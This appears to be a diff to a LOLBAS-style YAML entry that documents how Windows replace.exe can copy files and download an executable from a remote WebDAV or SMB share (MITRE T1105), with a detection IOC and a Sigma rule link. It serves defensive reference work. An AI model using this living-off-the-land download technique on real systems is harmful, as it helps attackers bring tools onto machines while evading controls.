@@ -1,18 +1,18 @@
 ---
 Name: Replace.exe
 Description: Used to replace file with another file
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: replace.exe C:\Source\File.cab C:\Destination /A
-    Description: Copy file.cab to destination
+  - Command: replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A
+    Description: Copy .cab file to destination
     Usecase: Copy files
     Category: Copy
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
-    Description: Download/Copy bar.exe to outdir
+  - Command: replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A
+    Description: Download/Copy executable to specified folder
     Usecase: Download file
     Category: Download
     Privileges: User
@@ -21,8 +21,6 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\replace.exe
   - Path: C:\Windows\SysWOW64\replace.exe
-Code_Sample:
-  - Code:
 Detection:
   - IOC: Replace.exe retrieving files from remote server
   - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_replace.yml
